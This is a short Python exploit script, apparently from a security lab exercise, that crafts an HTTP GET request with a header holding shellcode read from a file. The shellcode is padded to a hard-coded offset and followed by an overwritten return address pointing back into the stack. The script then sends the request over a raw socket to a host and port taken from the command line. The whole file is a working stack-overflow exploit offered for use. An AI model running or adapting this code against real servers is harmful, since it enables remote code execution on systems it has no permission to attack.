#!/usr/bin/env python3
import sys
import socket
import traceback
import urllib.parse
import struct

stack_buffer = 0x7fffffffda90
stack_retaddr = 0x7fffffffdcc8

def build_exploit(shellcode):
    shellfile = open("shellcode.bin", "rb") 
    shellcode = shellfile.read()

    req =   b"GET / HTTP/1.0\r\n" #+ \
            #b"\r\n"
    req += b"EXP: "
    req += shellcode + b"A" * ((stack_retaddr - stack_buffer) - len(shellcode))
    req += struct.pack('<Q', stack_buffer)

    req += b"\r\n"
    return req

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "rb")
    shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:")

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())